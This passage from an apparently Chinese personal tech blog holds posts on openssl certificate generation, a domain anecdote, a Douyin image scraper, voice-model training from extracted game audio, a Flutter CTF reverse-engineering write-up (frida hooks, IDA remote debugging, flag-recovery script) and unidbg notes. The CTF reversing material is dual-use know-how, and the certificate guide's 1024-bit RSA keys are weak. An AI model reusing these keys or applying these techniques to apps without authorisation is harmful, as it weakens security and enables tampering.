因为自签名证书完全免费，所以这里我们使用自签名证书来作为我们的客户端 / 服务端证书 # 生成自签名根证书 创建根证书私钥： openssl genrsa -out root.key 1024 创建根证书请求文件： openssl req -new -out root.csr -key root.key这一步以及下面生成服务器请求文件和客户端请求文件的过程都都要注意以下两点： 根证书的 Common Name 填写 root 就可以，所有客户端和服务器端的证书这个字段需要填写域名，一定要注意的是，根证书的这个字段和客户端证书、服务器端证书不能一样 其他所有字段的填写，根证书、服务器端证书、客户端证书需保持一致最后的密码可以直接回车跳过。 创建根证书： openssl x509 -req -in root.csr -out root.crt -signkey root.key -CAcreateserial -days 3650经过上面三个命令行，我们最终可以得到一个签名有效期为 10 年的根证书 root.crt，后面我们可以用这个根证书去颁发服务器证书和客户端证书。 # 生成自签名服务器端证书 生成服务器端证书私钥： openssl genrsa -out server.key 1024 生成服务器证书请求文件，过程和注意事项参考根证书，本节不详述： openssl req -new -out server.csr -key server.key 生成服务器端公钥证书 openssl x509 -req -in server.csr -out server.crt -CA root.crt -CAkey root.key -CAcreateserial -days 3650经过上面的三个命令，我们得到： server.key：服务器端的密钥文件 server.crt：有效期十年的服务器端公钥证书，使用根证书和服务器端私钥文件一起生成 # 生成自签名客户端证书 生成客户端证书密钥： openssl genrsa -out client.key 1024 生成客户端证书请求文件 openssl req -new -out client.csr -key client.key 生客户端证书 openssl x509 -req -in client.csr -out client.crt -CA root.crt -CAkey root.key -CAcreateserial -days 3650 生客户端 bks 格式证书 我们首先查看自己的 java 版本，例如我现在的 java 版本是 jdk1.7 PS C:\\Users\\oacia> java --versionjava 17.0.8 2023-07-18 LTS然后前往 [https://www.bouncycastle.org/latest_releases.html) 下载对应版本的 bcprov , 我的 jdk1.7 应该下载的 jar 包是 bcprov-jdk15to18-177.jar 随后输入下列命令即可将 crt 格式的证书转换为 bks 格式的证书 keytool -import -alias client -file .\\client.crt -keystore .\\client.bks -storetype BKS -provider org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath .\\bcprov-jdk15to18-177.jar -storepass 123456同理，我们可以将将根证书 root.crt 也转换为 root.bks , 因为在 Android 中智能识别 bks 格式的证书 ## 总结 通过上述过程自定义证书的制作，我们已经得到了所需要的证书 android 客户端 client.bks : 这是客户端证书，需要发送给服务端进行校验 root.bks : 这是根证书，用来校验服务端证书的合法性 python 服务端 server.crt 和 server.key : 这是服务端证书，需要发送给客户端进行校验 root.crt : 这是根证书，用来校验客户端证书的合法性 # Android 客户端 # 参考资料 关于单向认证与双向认证 阿里云 HTTPS 双向认证","categories":[],"tags":[]},{"title":"这两个月关于域名的二三事","slug":"blog-domain","date":"2023-12-12T16:59:22.000Z","updated":"2025-04-08T18:55:11.486Z","comments":true,"path":"blog-domain/","link":"","permalink":"https://oacia.dev/blog-domain/","excerpt":"","text":"今天刚在 namesilo 购买了一个新的域名 oacia.dev , 要是有人来过我的博客的话，应该记得这个博客曾经的域名是 oacia.cc , 当然了我也非常喜欢 cc 这个顶级域名，这个域名是我一年前注册的，不过不幸的是在今年九月份的时候，我的域名过期了，当时我看到 75 块的续费价格还纳闷为什么变贵了，因为去年的时候我记得非常清楚续费只需要三十多元的，随后就看到了阿里云的公告说 cc 域名要涨价了… 唉太难受了，随后我就去腾讯云和华为云都去搜了一下 cc 这个顶级域名的价格，随后惊讶的发现华为云只需要 35 元 / 年，当时我想那我直接把域名转到华为云不就好了，转移注册商应该是很方便的事情吧，随后我尝试一下才发现， 域名过期之后就不能再转移域名了，而我又不是很想在贵了接近 50％价格的阿里云续费域名，所以我想的是域名应该很快就会被删除了吧，结果呢，又去网上看了一下，cc 域名要等 30 天的续费宽限期和 29 天的赎回期之后才会被完全删除开放注册. 这就意味着我需要等到两个月之后 (也就是 12 月份), 这个域名才能重新购买，所以这段时间域名过期了之后我也就没有再管了，想着我只要等到 12 月份的时候再重新在华为云把 oacia.cc 这个域名买回来不就行了 于是等呀等呀等呀等呀，终于熬到了十二月份，说实话这两个月博客无法访问的时间让我发现我的博客对我来说有多么的重要。这两个月我总是无心研究，整天不知道怎么的时间就过去了，然后就到晚上了，然后就睡觉睡到第二天中午起来继续消磨时间，这种感觉就和我当时高考完之后在家无所事事的感觉特别相似，那一种一整天没有目标的感觉让我感觉特别的不舒服. 一个博客不仅能让我即时记录下现在学到的知识，我想这更是一种督促我去做自己想要做的事情的方式，因为博客是放在互联网上大家都可以看到，所以我就会在内心暗暗努力要好好去研究，写一些真正干货的文章给大家看. 当上周我发现域名已经进入等待删除期，即域名终于要被注册局删除，我可以重新到华为云注册的时候，我每一天，整天整天的去看 oacia.cc 的 whois 信息，期待着那一天我重新注册到 oacia.cc 这个域名，就在今天，12 月 12 号，当域名终于被注册局删除之后，当我满心欢喜的登录华为云准备买回域名的时候，我愕然发现，这个域名在十几分钟前，就在今天下午五点就被其他人抢先注册了 要说不难受肯定是假的，当时我愣在了电脑前很久，心想着这一定是假的，我之前搜索过这个二级域名，只有 com 是被注册的，其他的顶级域名都是没有被注册过的，照理来说相当的冷门才对，不过有点遗憾呢， oacia.cc 这个陪伴了我整整一年的域名就离我而去了，发了一条推特之后我也只能暗自苦笑着，谁让我慢人一步呢，或许有人比我更需要这个域名呢～ 不过我的博客的域名还等着定下来呢，整理了一下心情，我去外面走了走，出门吃了完牛丼饭，想着究竟用什么新域名好呢，但是在阿里云上下翻看，我还是对我那逝去的老域名念念不忘。我看到了 oacia.life , 这或许意为新生. oacia.co , 和我之前的域名长的可真像呢，但是我不由得伤感了起来，算了看到 co 容易联想到失去的 cc , 还是换一个罢。随后我想着不如买一个 com 域名，这个顶级域名听起来就相当的专业呐，但是 oacia.com 这个域名已经被注册掉了，想着后面加几个数字怎么样？不过我一看到这个域名，感觉英文 + 数字不太好看，所以也就 pass 掉了 然后我就去研究了一下别人的域名维术大佬的博客 weishu.me , oacia.me 这个域名看起来不错，但是我在阿里云，腾讯云，华为云都找不到这个顶级域名，我猜应该是已经下架了吧，因为我查询了一下维术大佬的博客的 whois 信息，发现是在阿里云注册的. 后来我看到了 seeflower 大佬的博客 seeflower.dev , 这个 dev 听起来好专业呐，而且感觉也非常契合我作为 developer 的自我定位，同时我觉得这个域名应该也谕示着我的 blog 的内容发展的越来越丰富，蒸蒸日上！组合了一下域名， oacia.dev , 天呐这个域名一听就超级 coooooooool 但是在阿里云，腾讯云，华为云都不能购买这个域名，随后我将目光转向了全球的域名注册商，godaddy 也不知道是什么原因无法进入 这该怎么办呢，我目前为止唯一知道的全球域名注册商就是 godaddy 了，这个时候又轮到 whois 查询派上用场了，我发现 seeflower.dev 是在 namesilo 注册的，而更加深入的了解之后，我发现 namesilo 竟然可以使用支付宝就能支付，去搜索了一下， oacia.dev 这个域名还没有被注册呢！于是我花了 12 刀，实际付了 86 块把域名买回来了，今晚配好 CNAME 之后，等一两天后 dns 域名解析同步完成之后，我的博客终于能再次被访问到了！ 回过头来，兜兜转转两个月，为了省下每年 30 多元域名的费用，不仅博客停摆了两个月之久，我感觉自己也似乎颓废了两个月，同时我也失去了 oacia.cc 这个陪伴我一年的域名，并且花了比在阿里云续费 oacia.cc 域名 (需要每年 75 元) 高了十多元的价格，在 namesilo 又重新购买了新的域名 oaica.dev (每年 12 刀，约合 86 元), 现在想来真是一段的神奇的经历，只有真正失去的时候，才会发现它曾经对我来说有多么的重要. 人生不过是一次路过，何必什么都抓住不放，用心享受途中的风景就好. Bye, oacia.cc Hello, oacia.dev","categories":[],"tags":[]},{"title":"抖音收藏夹图文批量获取","slug":"douyin-favorites-pic","date":"2023-11-09T13:24:38.000Z","updated":"2025-04-08T18:55:11.535Z","comments":true,"path":"douyin-favorites-pic/","link":"","permalink":"https://oacia.dev/douyin-favorites-pic/","excerpt":"","text":"最近想给自己的博客多增加些好看的图片当背景图，正好这段时间刷抖音看到了好多好看的图片，也把他们保存在收藏夹里面，但是正当我兴致勃勃的想把我收藏夹里面的图片下载下来时，发现工作量真的真的好大！所以索性就写个小脚本来让生活更加轻松咯～ 首先我们打开网页版抖音，来到收藏夹，然后疯狂向下拉直到收藏夹的底部 然后在网页上 右键-&gt;另存为... 把这个 html 保存为 mhtml 格式 接下来写个简单的小爬虫，抖音里面收藏的图片就下载到电脑上啦～ import reimport requestsimport osfrom tqdm import tqdmheader = &#123; \"User-Agent\": \"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36\"&#125;def douyin_pic(pid): # 获取 json 数据 p_id = \"https://m.douyin.com/web/api/v2/aweme/iteminfo/?reflow_source=reflow_page&amp;item_ids=&#123;&#125;&amp;a_bogus=\".format(pid) # print(p_id) p_rs = requests.get(url=p_id, headers=header).json() # print(p_rs) # 拿到 images 下的原图片 images = p_rs['item_list'][0]['images'] # 创建 pic 文件夹 if not os.path.exists('douyin/pic'): os.makedirs('douyin/pic') # 下载无水印照片 (遍历 images 下的数据) for index, im in enumerate(images): # 每一条数据下面都有四个原图链接这边用的是第一个 p_req = requests.get(url=im['url_list'][0]) # print(p_req) # 保存图片 # 拿到文件的长度，并把 total 初始化为 0 total = int(p_req.headers.get('content-length', 0)) # 打开当前目录的 fname 文件 (名字你来传入) # 初始化 tqdm，传入总数，文件名等数据，接着就是写入，更新等操作了 with open(f'douyin/pic/&#123;pid&#125;_&#123;str(index)&#125;.jpg', 'wb') as file, tqdm( total=total, unit='iB', desc=f\"&#123;pid&#125; 第&#123;index&#125;张图片\", unit_scale=True, unit_divisor=1024, ) as bar: for data in p_req.iter_content(chunk_size=1024): size = file.write(data) bar.update(size) index += 1with open('my.mhtml', 'r') as f: data = f.read()data = data.strip().replace(\"=\", \"\")pic = re.findall(r'https://www.douyin.com/note/(\\d+)', data)for p in pic: try: douyin_pic(p) except: print(f\"pid &#123;p&#125; went wrong!!!\")","categories":[],"tags":[]},{"title":"I wanna hear your voice, hina","slug":"hina-AI-voice","date":"2023-11-06T09:31:57.000Z","updated":"2025-04-08T18:55:11.613Z","comments":true,"path":"hina-AI-voice/","link":"","permalink":"https://oacia.dev/hina-AI-voice/","excerpt":"","text":"很喜欢日奈的声音，所以用自己的电脑训练了 hina 的声音模型，并让她唱了一首歌 # python 虚拟环境搭建 这里我使用的 Python 版本为 Python3.9 安装 virtualenv pip install virtualenvpip install virtualenvwrapper # 这是对 virtualenv 的封装版本，一定要在 virtualenv 后安装创建虚拟环境 这里我创建了名为 hina 的虚拟环境 PS E:\\virtualenvs> virtualenv hina进入虚拟环境 命令行前面有 (hina) 说明我们已经进入了这个虚拟环境 PS E:\\virtualenvs> cd .\\hina\\Scripts\\PS E:\\virtualenvs\\hina\\Scripts> .\\activate(hina) PS E:\\virtualenvs\\hina\\Scripts># pytorch 安装 首先进入 pytorch 官网 然后输入 nvidia-smi 命令查看 N 卡 (必须是 N 卡！A 卡是不行的) 支持的最大 CUDA 版本，我这里是 12.2 然后运行 Run this Command 中显示的命令 pip3 install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu121# so vits svc 5.0 环境搭建 下载源码 git clone https://github.com/PlayVoice/so-vits-svc-5.0.git --depth=1安装项目依赖 pip install -r .\\requirements.txt下载其他必要文件 因为有文件需要从 google drive 下载，所以记得挂好代理哦 首先下载 gdown 和 wget pip install gdown, wget然后在项目文件夹内新建 download.py 并将下面的代码 (我写的 XD) 复制到 download.py 中 import gdownimport wgetimport osFile_DICT = &#123; # folder:https://drive.google.com/drive/folders/15oeBYf6Qn1edONkVLXe82MzdIi3O_9m3 # we only need best_model.pth.tar according to README.md \"Speaker-Encoder\": &#123; \"name\": \"best_model.pth.tar\", \"url\": \"1UPjQ2LVSIt3o-9QMKMJcdzT8aZRZCI-E\", \"output_path\": \"speaker_pretrain/best_model.pth.tar\", \"gdrive\": True &#125;, \"whisper-large-v2\": &#123; \"name\": \"large-v2.pt\", \"url\": \"https://openaipublic.azureedge.net/main/whisper/models/81f7c96c852ee8fc832187b0132e569d6c3065a3252ed18e56effd0b6a73e524/large-v2.pt\", \"output_path\": \"whisper_pretrain/\", \"gdrive\": False &#125;, \"hubert_soft model\": &#123; \"name\": \"hubert-soft-0d54a1f4.pt\", \"url\": \"https://github.com/bshall/hubert/releases/download/v0.1/hubert-soft-0d54a1f4.pt\", \"output_path\": \"hubert_pretrain/\", \"gdrive\": False &#125;, \"crepe full\": &#123; \"name\": \"full.pth\", \"url\": \"https://github.com/maxrmorrison/torchcrepe/raw/master/torchcrepe/assets/full.pth\", \"output_path\": \"crepe/assets\", \"gdrive\": False &#125;, \"pretrain model\": &#123; \"name\": \"sovits5.0.pretrain.pth\", \"url\": \"https://github.com/PlayVoice/so-vits-svc-5.0/releases/download/5.0/sovits5.0.pretrain.pth\", \"output_path\": \"vits_pretrain/\", \"gdrive\": False &#125;&#125;def main(): REPO_PATH = (os.path.dirname(os.path.abspath(__file__))) try: for key, value in File_DICT.items(): path = os.path.join(REPO_PATH, value[\"output_path\"]) print(\"Downloading &#123;&#125; to &#123;&#125;...\".format(value[\"name\"], path)) if value[\"gdrive\"]: gdown.download(id=value[\"url\"], output=path, quiet=False) print(\"Done!\") else: wget.download(value[\"url\"], out=path) print(\"\\nDone!\") except Exception as e: print(\"[!] Exception in download_binaries\\n&#123;&#125;\".format(e))if __name__ == \"__main__\": main()随后在虚拟环境中运行 download.py 就可以啦 (hina) PS E:\\AI\\so-vits-svc-5.0> python .\\download.py运行如下命令测试环境是否搭建成功 python svc_inference.py --config configs/base.yaml --model ./vits_pretrain/sovits5.0.pretrain.pth --spk ./configs/singers/singer0001.npy --wave test.wav在当前目录下出现 svc_out.wav 就说明可以正常使用啦 # 获取 hina 的声音 # 从 gamekee 中获取 在 gamekee 中，我们可以获取 hina 的音频，我们只需要写一个非常 easy 的 python 代码来把 hina 的声音下载下来 import requestsimport reimport wgetimport osHINA = &#123; \"hina_water\":\"https://ba.gamekee.com/83729.html\",#日奈 - 水着 \"hina\":\"https://ba.gamekee.com/59934.html\"#日奈&#125;for key,value in HINA.items(): if not os.path.exists(key): os.mkdir(key) data = requests.get(value) voices = re.findall(r'src=\"//(.*?\\.(?:mp3|wav))\"', data.text) for v in voices: wget.download(\"http://\"+v,key) print(f\"download &#123;v&#125; success\")# 从游戏资源中获取 由于 hina 是蔚蓝档案中的角色，所以我们需要将 hina 的音频资源从游戏文件中提取出来，首先要做的就是在模拟器从谷歌商店中下载蔚蓝档案，这里我使用的模拟器是雷电模拟器 然后在 设置-&gt;其他设置 中开启 ROOT权限 然后我们在侧边栏找到 更多-&gt;共享文件-&gt;打开安卓文件夹 ，找到安卓共享文件夹文件名为 /mnt/shared/Pictures 随后安装 MT 管理器并打开，在右侧边栏进入 mnt/shared/Pictures 在左侧边栏进入 /storage/emulated/0/Android/data , 找到文件夹名称为 com.nexon.bluearchive , 这个文件夹是蔚蓝档案全部音频图片资源文件的所在位置，长按该文件夹，并选择 复制-&gt; 等到复制完成之后，在侧边栏点击 更多-&gt;共享文件-&gt;打开电脑文件夹 即可找到保存到电脑上的蔚蓝档案资源文件～ 随后我们进入到 com.nexon.bluearchive\\files\\PUB\\Resource\\GameData\\MediaResources\\Audio\\VOC_JP\\JP_Hina , 这里就是 hina 的全部音频啦 由于获取到的是 ogg 格式的文件，所以我们需要使用格式工厂把 ogg 文件全部转换成 wav 文件 然后在新建一个 so-vits-svc-5.0\\dataset_raw\\JP_Hina 文件夹，并将我们转换完成的 hina 的音频复制到这个文件夹中 # 数据预处理 python svc_preprocessing.py -t 2-t：指定线程数，必须是正整数且不得超过 CPU 总核心数，一般写 2 就可以了 进阶命令 重采样 生成采样率 16000Hz 音频，存储路径为：./data_svc/waves-16k python prepare/preprocess_a.py -w ./dataset_raw -o ./data_svc/waves-16k -s 16000 生成采样率 32000Hz 音频，存储路径为：./data_svc/waves-32k python prepare/preprocess_a.py -w ./dataset_raw -o ./data_svc/waves-32k -s 32000 使用 16K 音频，提取音高 python prepare/preprocess_crepe.py -w data_svc/waves-16k/ -p data_svc/pitch 使用 16k 音频，提取内容编码 python prepare/preprocess_ppg.py -w data_svc/waves-16k/ -p data_svc/whisper 使用 16k 音频，提取内容编码 python prepare/preprocess_hubert.py -w data_svc/waves-16k/ -v data_svc/hubert 使用 16k 音频，提取音色编码 python prepare/preprocess_speaker.py data_svc/waves-16k/ data_svc/speaker 提取音色编码均值；用于推理，也可作为发音人统一音色用于生成训练索引（数据音色变化不大的情况下） python prepare/preprocess_speaker_ave.py data_svc/speaker/ data_svc/singer 使用 32k 音频，提取线性谱 python prepare/preprocess_spec.py -w data_svc/waves-32k/ -s data_svc/specs 使用 32k 音频，生成训练索引 python prepare/preprocess_train.py 训练文件调试 python prepare/preprocess_zzz.py # 训练 参数调整 如果基于预训练模型微调，需要下载预训练模型 sovits5.0.pretrain.pth 并且放在项目根目录下面 并且修改 configs/base.yaml 的参数 pretrain: &quot;./vits_pretrain/sovits5.0.pretrain.pth&quot; ，并适当调小学习率（建议从 5e-5 开始尝试） learning_rate &amp; batch_size &amp; accum_step 为三个紧密相关的参数，需要仔细调节 batch_size 乘以 accum_step 通常等于 16 或 32，对于低显存 GPU，可以尝试 batch_size = 4，accum_step = 4 开始训练 python svc_trainer.py -c configs/base.yaml -n sovits5.0 恢复训练 python svc_trainer.py -c configs/base.yaml -n sovits5.0 -p chkpt/sovits5.0/sovits5.0_0***.pt 训练日志可视化 tensorboard --logdir logs/ # 人声伴奏分离 想让 hina 唱出单相思，那么有伴奏是肯定不行滴，我们需要将人声和伴奏分离 # UVR5 这里需要使用到的工具是 Ultimate Vocal Remover 5 (UVR5), 并下载对应的处理模型。 可以前往这个网站查看模型的得分 一些推荐的处理模型和功能如下： Demucs | MDX23C : 分离人声及伴奏 VR Architecture - 5_HP-Karaoke-UVR : 分离和声 VR Architecture - UVR-DeEcho-DeReverb : 去除混响和回声 可以先使用 Demucs | MDX23C 来分离人声及伴奏，如果听到人声有和声的话，可以用 VR Architecture - 5_HP-Karaoke-UVR 来二次处理 当然，为了方便也可以直接去 b 站找到别人分离好的人声用啦～ # 推理 导出推理模型：文本编码器，Flow 网络，Decoder 网络；判别器和后验编码器等只在训练中使用 python svc_export.py --config configs/base.yaml --checkpoint_path chkpt/sovits5.0/sovits5.0_0***.pt 推理 如果不想手动调整 f0，只需要最终的推理结果，运行下面的命令即可 python svc_inference.py --config configs/base.yaml --model sovits5.0.pth --spk ./data_svc/singer/修改成对应的名称.npy --wave test.wav --shift 0 如果需要手动调整 f0，依据下面的流程操作 使用 whisper 提取内容编码，生成 test.ppg.npy python whisper/inference.py -w test.wav -p test.ppg.npy 使用 hubert 提取内容编码，生成 test.vec.npy python hubert/inference.py -w test.wav -v test.vec.npy 提取 csv 文本格式 F0 参数，用 Excel 打开 csv 文件，对照 Audition 或者 SonicVisualiser 手动修改错误的 F0 python pitch/inference.py -w test.wav -p test.csv 最终推理 python svc_inference.py --config configs/base.yaml --model sovits5.0.pth --spk ./data_svc/singer/修改成对应的名称.npy --wave test.wav --ppg test.ppg.npy --vec test.vec.npy --pit test.csv --shift 0 一些注意点 当指定–ppg 后，多次推理同一个音频时，可以避免重复提取音频内容编码；没有指定，也会自动提取 当指定–vec 后，多次推理同一个音频时，可以避免重复提取音频内容编码；没有指定，也会自动提取 当指定–pit 后，可以加载手工调教的 F0 参数；没有指定，也会自动提取 生成文件在当前目录 svc_out.wav args –config –model –spk –wave –ppg –vec –pit –shift name 配置文件 模型文件 音色文件 音频文件 ppg 内容 hubert 内容 音高内容 升降调 去噪后处理 python svc_inference_post.py --ref test.wav --svc svc_out.wav --out svc_out_post.wav","categories":[],"tags":[]},{"title":"flutter逆向 ACTF native app","slug":"flutter-ACTF-native-app","date":"2023-10-31T10:04:59.000Z","updated":"2025-04-08T18:55:11.540Z","comments":true,"path":"flutter-ACTF-native-app/","link":"","permalink":"https://oacia.dev/flutter-ACTF-native-app/","excerpt":"","text":"# 前言 算了一下好长时间没打过 CTF 了，前两天看到 ACTF 逆向有道 flutter 逆向题就过来玩玩啦，花了一个下午做完了。说来也巧，我给 DASCTF 十月赛出的逆向题其中一道也是 flutter, 不过那题我难度降的相当之低啦，不知道有多少人做出来了呢～ # 还原函数名 flutter 逆向的一大难点就是不知道 libapp.so 的函数名，虽然有工具 reflutter 可以帮助我们得到其中的符号，但是我个人认为基于对 libflutter.so 源码插桩后重编译再重打包 apk 的方式具有极大的不可预料性，极有可能导致 apk 闪退，这一题便出现了这种情况，所以接下来我将介绍的工具 blutter 是纯静态分析来还原函数名，更令人惊喜的是它提供了 IDApython 脚本来让我们可以在 IDA 中对函数进行重命名，而这个项目中提供的其他文件也相当好用 # blutter 的编译及使用 blutter 项目地址 https://github.com/worawit/blutter在各个平台如何编译在这个项目的 README.md 中写的已经相当详细了，这里我就简单介绍一下 Windows 上的编译过程吧，注意一下这些命令需要全程运行在代理环境否则会导致无法下载 首先 clone 项目 git clone https://github.com/worawit/blutter --depth=1随后运行初始化脚本 cd .\\blutter\\python .\\scripts\\init_env_win.py请注意，接下来我们需要打开 x64 Native Tools Command Prompt , 它可以在 Visual Studio 文件夹中找到 然后运行 blutter.py 并提供 libapp.so 和 libflutter.so 的文件夹路径以及输出文件夹路径 python .\\blutter.py ..\\chall\\lib\\arm64-v8a\\ .\\output 输出文件夹目录如下 随后我们用 ida 反编译 libapp.so , 并运行输出文件夹中的 IDApython 脚本 ida_script/addNames.py , 符号就被全部恢复出来啦 # hook 关键函数 获取函数参数 这里我们需要关注的函数是 flutter_application_1_main__LongPressDemoState::_onTap , 因为在 flutter 的开发中，onTap 函数是按钮点击之后的响应函数 随后我们进入 sub_1DE500 , 在该函数中双击 sub_1DE59C 进入 在这个函数中我们发现了 256 , % , ^ 这些特征，合理猜测一下算法可能是 RC4 接下来我们使用输出文件夹中的 blutter_frida.js hook 一下 sub_1DE59C 看看情况 PS D:\\hgame\\ACTF\\native app\\work\\blutter> frida -U -f \"com.example.flutter_application_1\" -l .\\output\\blutter_frida.js[Pixel 3::com.example.flutter_application_1 ]-> Unhandle class id: 46, TypeArgumentsGrowableList@6d00488c29 = [ 188676, 0, &#123; \"key\": \"Unhandle class id: 46, TypeArguments\" &#125;, 34, &#123; \"key\": [ 184, 132, 137, 215, 146, 65, 86, 157, 123, 100, 179, 131, 112, 170, 97, 210, 163, 179, 17, 171, 245, 30, 194, 144, 37, 41, 235, 121, 146, 210, 174, 92, 204, 22 ] &#125;, 0, 0, 0]这里我们只 hook 到一个数组的值，另一个数组的类型是 TypeArguments , 研究了一下 blutter_frida.js 后发现作者还没有对这种数据类型格式提供 hook 支持 # IDA 动态调试 libapp.so 现在我们得到了一个数组，我们就暂时认为它就是 flag 经过加密之后得到的结果，接下来我们在 IDA 中对 sub_1DE59C 下断点动态调试来更加深入的研究一下 首先我们需要将 IDA 文件夹中的 dbgsrv/android_server64 push 到手机上面，然后运行一下并且指定端口 blueline:/data/local/tmp # ./as64 -p 11112IDA Android 64-bit remote debug server(ST) v7.7.27. Hex-Rays (c) 2004-2022Listening on 0.0.0.0:11112...随后端口转发一下 PS C:\\Users\\oacia> adb forward tcp:11112 tcp:1111211112在 IDA 中选择调试器为 Android debugger 随后点击 Debugger-&gt;Debugger options... 选择如下配置 点击 Debugger-&gt;Process options... , Hostname 修改为 127.0.0.1 , Port 修改为 11112 然后点击 Debugger-&gt;Attach to process... , 附加到我们目标包名的进程上面 弹出该弹窗选择 Same 即可 在手机上点击按钮，然后在 IDA 中点击这个绿色的剪头，就可以动态调试啦 在动态调试之后，未知的变量也逐渐浮现了出来，这里我们发现了 v28&gt;=256 , 那么很有可能就是 RC4 了哦 既然这样，那么直接在这里唯一的异或的地方用 IDA 去 trace 一下，把异或的数组 dump 下来不就行了：) 于是我们得到了被异或的数组了 但是在异或运算的地方下断点之后，我输入的数全都是 1 , 这里被异或的数也全是 0xce 所以莫非不是 RC4? 让 0xce 和 0x31 异或一下看看，竟然是 0xff 这么有意义的数字 所以 exp 也就能写出来啦～ final = [184, 132, 137, 215, 146, 65, 86, 157, 123, 100, 179, 131, 112, 170, 97, 210, 163, 179, 17, 171, 245, 30, 194, 144, 37, 41, 235, 121, 146, 210, 174, 92, 204, 22]xor = [14, 14, 68, 80, 29, 201, 241, 46, 197, 208, 123, 79, 187, 55, 234, 104, 40, 117, 133, 12, 67, 137, 91, 31, 136, 177, 64, 234, 24, 27, 26, 214, 122, 217]flag = [chr(xor[i]^final[i]^0xff) for i in range(len(final))]print(''.join(flag))# Iu2xpwXLAK734btEt9kXIhfpRgTlu6KuI0","categories":[],"tags":[]},{"title":"unidbg 学习笔记","slug":"unidbg-usage","date":"2023-10-26T09:26:55.000Z","updated":"2025-04-08T18:55:12.025Z","comments":true,"path":"unidbg-usage/","link":"","permalink":"https://oacia.dev/unidbg-usage/","excerpt":"","text":"# 下载地址 https://github.com/zhkl0228/unidbg 源码下载完成后使用 IDEA 打开即可使用 # 快速使用 套用以下模板，将包名等参数替换成对应的字符串即可快速使用 unidbg package com.oacia;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.Module;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.DalvikModule;import com.github.unidbg.linux.android.dvm.VM;import com.github.unidbg.memory.Memory;import java.io.File;public class Myunidbg &#123; private final AndroidEmulator emulator; private final VM vm; private DalvikModule dm; private Module module; public Myunidbg() &#123; // 创建模拟器 emulator = AndroidEmulatorBuilder .for64Bit() /* hypervisor 引擎可以在搭载了 Apple Silicon 芯片的设备上模拟执行 KVM 引擎可以在树莓派上模拟执行 Dynarmic 引擎是为了更快的模拟执行 Unicorn 是最强大最完善的模拟执行引擎，但它的缺点是慢 */ .addBackendFactory(new Unicorn2Factory(true)) .setProcessName(\"com.oacia.test\") .build(); // 获取操作内存的接口 Memory memory = emulator.getMemory(); // 设置 andorid 系统库版本 memory.setLibraryResolver(new AndroidResolver(26)); // 创建虚拟机 vm = emulator.createDalvikVM(); // 开启 log vm.setVerbose(true); // 加载目标库 dm = vm.loadLibrary(new File(\"E:\\\\oacia\\\\libtprt.so\"), false); module = dm.getModule(); // 执行 JNIOnLoad（如果有的话） dm.callJNI_OnLoad(emulator); &#125; public static void main(String[] args) &#123; &#125;&#125;如果运行时提示缺少某些库，可以在加载目标库前添加如下代码预加载缺少的系统库，系统库的位置位于 /system/lib64/ , 将这些系统库从手机复制到电脑上即可 vm.loadLibrary(new File(\"f:\\\\androidlib\\\\libc.so\"),false);vm.loadLibrary(new File(\"f:\\\\androidlib\\\\libm.so\"),false);vm.loadLibrary(new File(\"f:\\\\androidlib\\\\libstdc++.so\"),false);vm.loadLibrary(new File(\"f:\\\\androidlib\\\\ld-android.so\"),false);vm.loadLibrary(new File(\"f:\\\\androidlib\\\\libdl.so\"),false);如果在 JNI 层中调用了 java 层中的函数，同样会引起 unidbg 引擎报错，此时需要自行补充缺失的 java 层的方法，并重写调用 Java 层函数时用到的 JNI 方法，缺少变量的情况同理 举个例子，在这个 JNI 函数中调用了 java 层中 base64 这个方法 所以我们需要在 unidbg 的 Java 文件中补充上对应的方法 public class MainActivitymethod1 extends AbstractJni &#123; private static DvmClass MainActivityClass; @Override /* * base64 是 java 层的方法，这里重写 callObjectMethodV 方法：一旦发现调用的是 java 层的 base64 方法，这里就用自己复现的 base64 方法替换 * */ public DvmObject&lt;?> callObjectMethodV(BaseVM vm, DvmObject&lt;?> dvmObject, String signature, VaList vaList) &#123; System.out.println(\"callObjectMethodV->\"+signature); if(signature.equals(\"com/example/testjni/MainActivity->base64(Ljava/lang/String;)Ljava/lang/String;\"))&#123; DvmObject dvmobj=vaList.getObjectArg(0); String arg= (String) dvmobj.getValue(); String result=base64(arg); return new StringObject(vm,result); &#125; return super.callObjectMethodV(vm, dvmObject, signature, vaList); &#125; @Override /* * staticcontent 是 java 层的静态变量；getStaticObjectField，一旦检测到 so 层引用这个变量，那么自己返回这个变量的值 * */ public DvmObject&lt;?> getStaticObjectField(BaseVM vm, DvmClass dvmClass, String signature) &#123; System.out.println(\"getStaticObjectField->\"+signature); if(signature.equals(\"com/example/testjni/MainActivity->staticcontent:Ljava/lang/String;\"))&#123; return new StringObject(vm,\"staticcontent\");// 源码 public static string staticcontent = \"staticcontent\" &#125; return super.getStaticObjectField(vm, dvmClass, signature); &#125; @Override /* * objcontent 是 java 层的变量；这里重写 getObjectField 方法，一旦检测到 so 层引用这个变量，那么自己返回这个变量的值 * */ public DvmObject&lt;?> getObjectField(BaseVM vm, DvmObject&lt;?> dvmObject, String signature) &#123; System.out.println(\"getObjectField->\"+signature); if(signature.equals(\"com/example/testjni/MainActivity->objcontent:Ljava/lang/String;\"))&#123; return new StringObject(vm,\"objcontent\");//public string objcontent &#125; return super.getObjectField(vm, dvmObject, signature); &#125; /* * java 层的方法，这里需要复现，否则不知道怎么执行 * */ public String base64(String arg3) &#123; String result=Base64.encodeBase64String(arg3.getBytes()); return result; &#125; &#125;# AndroidEmulator 操作 public void AndroidEmulator_use()&#123; // 获取内存操作接口 Memory memory = emulator.getMemory(); // 获取进程 pid int pid = emulator.getPid(); // 创建虚拟机 VM dalvikVM = emulator.createDalvikVM(); // 创建虚拟机并指定 APK 文件 VM dalvikVM = emulator.createDalvikVM(new File(\"E:/oacia/my.apk\")); // 获取已创建的虚拟机 VM dalvikVM = emulator.getDalvikVM(); // 显示当前寄存器状态 可指定寄存器 emulator.showRegs(); // 获取后端 CPU Backend backend = emulator.getBackend(); // 获取进程名 String processName = emulator.getProcessName(); // 获取寄存器 RegisterContext context = emulator.getContext(); //Trace 读内存 emulator.traceRead(1,0); //Trace 写内存 emulator.traceWrite(1,0); //Trace 汇编 